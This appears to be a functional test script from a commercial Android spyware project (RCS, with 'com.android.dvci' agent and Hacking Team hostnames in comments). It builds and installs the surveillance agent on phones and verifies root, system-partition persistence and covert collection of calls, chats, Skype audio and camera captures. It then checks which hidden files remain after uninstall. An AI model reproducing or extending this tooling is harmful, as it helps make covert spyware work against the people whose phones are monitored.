# -*- coding: utf-8 -*-

import sys, time
import csv
import os
import inspect
import traceback
import collections
import datetime

import argparse
import commands_device
from scripts.mobile.hardware.commands_device import CommandsDevice
from scripts.mobile.hardware.utils import wifiutils
from commands_rcs import CommandsRCS, CommandsRCSPolluce

import package

# apk_template = "build/android/install.%s.apk"
apk_template = "assets/autotest.%s.apk"
service = 'com.android.dvci'


def say(text):
    os.system("say " + text)


def check_install(command_dev, results):
    still_infected = False
    if command_dev.check_infection():
        command_dev.uninstall_agent()

        still_infected = command_dev.check_infection()

    if still_infected:
        print "Error, still installed"
        return False

    results["packages_remained"] = still_infected
    return True


def install(command_dev, results):
    if results['release'].startswith("2"):
        agent = "agent_v2"
    else:
        agent = "agent"

    print "... installing %s" % agent
    # install
    if not command_dev.install(agent):
        return False

    results["installed"] = True
    print "installation: OK"
    return True


def check_evidences(command_dev, c, results, timestamp=""):
    time.sleep(60)
    evidences, kinds = c.evidences()

    for k in ["call", "chat", "camera", "application"]:
        if k not in kinds.keys():
            kinds[k] = []

    ev = "\n"
    ok = kinds.keys()
    ok.sort()
    for k in ok:
        ev += "\t\t%s: %s\n" % (k, len(kinds[k]))
        if k in ["chat", "addressbook", "call"]:
            program = [e['data']['program'] for e in evidences if e['type'] == k]
            chat = set(program)
            for c in chat:
                ev += "\t\t\t%s\n" % (c)

    results['evidences' + timestamp] = ev
    results['evidence_types' + timestamp] = kinds.keys()

    results['uptime' + timestamp] = command_dev.get_uptime()

    expected = set()
    packages = command_dev.get_packages()
    for i in ['skype', 'facebook', 'wechat', 'telegram', 'hangout', 'android.talk', 'line.android', 'viber',
              'tencent.mm', 'whatsapp']:
        for p in packages:
            if i in p:
                expected.add(i)

    results['expected'] = list(expected)


def uninstall_agent(commands_device, c, results):
    c.uninstall()

    say("agent uninstall, verify request")

    for i in range(12):
        time.sleep(10)

        processes = commands_device.get_processes()
        uninstall = service not in processes
        if uninstall:
            break

    results['uninstall'] = uninstall

    if not uninstall:
        print "uninstall: ERROR"
        print "processes: %s" % processes
        commands_device.uninstall_agent()
    else:
        print "uninstall: OK"


def check_uninstall(commands_device, results, reboot=True):
    if reboot:
        print ".... reboot"
        commands_device.reboot()
        time.sleep(60)

    processes = commands_device.get_processes()
    running = "still running: %s" % service in processes
    results['running'] = running

    res = commands_device.execute(
        "ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
    results["files_remained"] = res

    # res = adb.executeSU('cat /data/system/packages.list  | grep -i -e "dvci" -e "deviceinfo" -e "StkDevice"')
    #res += adb.executeSU('cat /data/system/packages.xml  | grep -i -e "dvci" -e "device" -e "StkDevice"')
    res = commands_device.execute('pm path com.android.deviceinfo')
    res += commands_device.execute('pm path com.android.dvci')

    results["packages_remained"] = res


def check_skype(command_dev, c, results):
    supported = ['4.0', '4.1', '4.2', '4.3']
    release = results['release'][0:3]

    results['call_supported'] = release in supported
    if release not in supported:
        print "Call not supported"
        return

    print "... waiting for call inject"
    info_evidences = []
    counter = 0
    while not info_evidences and counter < 10:
        info_evidences = c.infos('Call')

        counter += 1
        if not info_evidences:
            print "... waiting for info"
            time.sleep(10)
        else:
            break

    for i in range(10):
        time.sleep(10)
        ret = command_dev.execute_root("ls /data/data/com.android.dvci/files/l4")
        print ret
        if "No such file" not in ret:
            print "Skype call and sleep"
            command_dev.skype_call()
            time.sleep(90)
            ret = command_dev.execute_root("ls /data/data/com.android.dvci/files/l4")
            print ret
            break


def check_camera(command_dev):
    command_dev.press_key_home()
    command_dev.execute("am start -a android.media.action.IMAGE_CAPTURE")
    time.sleep(10)


def set_properties(command_dev, results):
    # getprop device
    props = command_dev.get_properties()
    device = "%s %s" % (props["manufacturer"], props["model"])

    results['time'] = "%s" % datetime.datetime.now()
    results['device'] = device
    results['id'] = command_dev.get_dev_deviceid()
    results['release'] = props["release"]
    results['selinux'] = props["selinux"]
    results['build_date'] = props["build_date"]
    results['error'] = ""
    results["return"] = ""
    return results


def check_persistence(command_dev, c, results, delay=30):
    print "... reboot and check persistence"
    command_dev.press_key_home()

    if not command_dev.check_remote_file("StkDevice.apk", "/system/app", timeout=30):
        results["persistence"] = "No";

    command_dev.reboot()
    time.sleep(delay)

    c.wait_for_start(2)

    command_dev.unlock()

    ret = command_dev.execute("ls /system/app/StkDevice.apk")

    inst = command_dev.execute("pm path com.android.dvci")
    if "/data/app/" in inst:
        if "No such file" in ret:
            results["persistence"] = "No";
        else:
            results["persistence"] = "Reboot"
    elif "/system/app/" in inst:
        results["persistence"] = "Yes";
        print "... got persistence"
    else:
        results["persistence"] = "Error";


def report_if_exists(results, param):
    report = ""
    for p in param:
        report += "\t%s: %s\n" % (p, results.get(p, ""))
    return report


def report_test_rail(results):
    report = ""
    report += "Installation\n"
    report += report_if_exists(results,
                               ["time", "installed", "executed", "instance_name", "info", "uptime_first", "uptime_last",
                                "error",
                                "exception"])
    report += "Device\n"
    report += report_if_exists(results, ["device", "id", "release", "build_date"])
    report += "Root\n"
    report += report_if_exists(results, ["root", "root_first", "su", "selinux", "persistence"])
    report += "Evidences\n"
    report += report_if_exists(results, ["evidences_first", "evidences_last"])
    report += "Expected\n"
    report += report_if_exists(results, ["call_supported", "expected"])
    report += "Uninstall\n"
    report += report_if_exists(results, ["uninstall", "running", "files_remained", "packages_remained"])

    print report
    return report


def report_files(results, report):
    with open('report/test-%s.%s.txt' % (results.get('id', 0), results.get('device', "device")), 'ab') as tfile:
        tfile.write(report)

    with open('report/test-%s.%s.csv' % (results.get('id', 0), results.get('device', "device")), 'ab') as csvfile:
        # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)
        devicelist.writerow(results.values())

    with open('report/hardware.logs.txt', 'a+') as logfile:
        logfile.write(str(results))
        logfile.write("\n")

    with open('report/hardware.logs.py', 'a+') as logfile:
        logfile.write("h.append(collections." + str(results) + ")")
        logfile.write("\n")


def test_device(id, command_dev, args, results):
    if args.fastnet:
        command_dev.wifi('open', check_connection=False, install=True)
        exit(0)

    if args.reboot:
        command_dev.reboot()

    # tests = ["sync","persistence","root", "skype","camera"]
    #tests = ["persistence"]

    demo = True
    device_id = command_dev.get_dev_deviceid()

    #commands_rcs = CommandsRCS(host = "192.168.100.100", login_id = id, device_id = device_id, operation = "Rite_Mobile", target_name = "HardwareFunctional", factory = 'RCS_0000002050')
    commands_rcs = CommandsRCSPolluce(login_id=id, device_id=device_id)

    #build.connection.host = "rcs-zeus-master.hackingteam.local"
    #build.connection.operation = "Rite_Mobile"
    #target_name = "Functional"
    #factory = "RCS_0000000008"

    if args.build or not os.path.exists('assets/autotest.default.apk'):
        config = open('assets/config_mobile.json').read()
        config = config.replace("$(HOSTNAME)", commands_rcs.host)
        f = open("build/config.upload.json", "w")
        f.write(config)
        f.close()

        # push new conf
        os.system('ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -c build/config.upload.json' % (
        commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory))

        if demo:
            json = "build.demo.json"
        else:
            json = "build.nodemo.json"
        # build
        os.system(
            'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (
            commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json))
        os.system('unzip -o  and.zip -d assets')
        os.remove('and.zip')
    if not os.path.exists('assets/autotest.default.apk'):
        print "ERROR, cannot build apk"
        exit(0)

    command_dev.sync_time()
    set_properties(command_dev, results)

    command_dev.unlock_screen()

    try:
        with commands_rcs as c:
            commands_rcs.delete_old_instance()

            # install agent and check it's running
            if check_install(command_dev, results):
                install(command_dev, results)

            results["executed"] = command_dev.execute_agent()
            if not results["executed"]:
                return "execution failed"

            command_dev.press_key_home()

            # sync e verifica
            c.wait_for_sync()

            # rename instance
            results['instance_name'] = c.rename_instance(results['device'])

            # check for root
            results["su"] = command_dev.info_root()

            result, root, info = c.check_root()
            results['root'] = root
            results['root_first'] = result
            check_evidences(command_dev, c, results, "_first")

            time.sleep(20)
            check_persistence(command_dev, c, results)

            result, root, info = c.check_root()
            time.sleep(30)

            if result:
                # skype call
                check_skype(command_dev, c, results)

                # check camera
                check_camera(command_dev)

            # evidences
            check_evidences(command_dev, c, results, "_last")

        if args.interactive:
            say("press enter to uninstall %s" % id)
            ret = raw_input("... PRESS ENTER TO UNINSTALL\n")

        # uninstall
        uninstall_agent(command_dev, c, results)

        # check uninstall after reboot
        check_uninstall(command_dev, results)

    except Exception, ex:
        traceback.print_exc(device_id)
        results['error'] = "%s" % ex


def parse_args():
    parser = argparse.ArgumentParser(description='AVMonitor master.')
    parser.add_argument('-b', '--build', required=False, action='store_true',
                        help="Rebuild apk")
    parser.add_argument('-i', '--interactive', required=False, action='store_true',
                        help="Interactive execution")
    parser.add_argument('-f', '--fastnet', required=False, action='store_true',
                        help="Install fastnet")
    parser.add_argument('-r', '--reboot', required=False, action='store_true',
                        help="Install fastnet")

    args = parser.parse_args()

    return args


def main():
    # from AVCommon import logger
    # logger.init()

    command_dev = CommandsDevice()

    args = parse_args()
    results = collections.OrderedDict()

    try:
        test_device(id, command_dev, args, results)
    except Exception, ex:
        print ex
        traceback.print_exc()
        results['exception'] = ex

    print results
    report = report_test_rail(results)
    report_files(results, report)

    print "Fine."
    say("test ended %s" % id)
    print "Check manually with the evidences in the instance: %s" % (results.get('instance_name', "NO SYNC"))


if __name__ == "__main__":
    main()
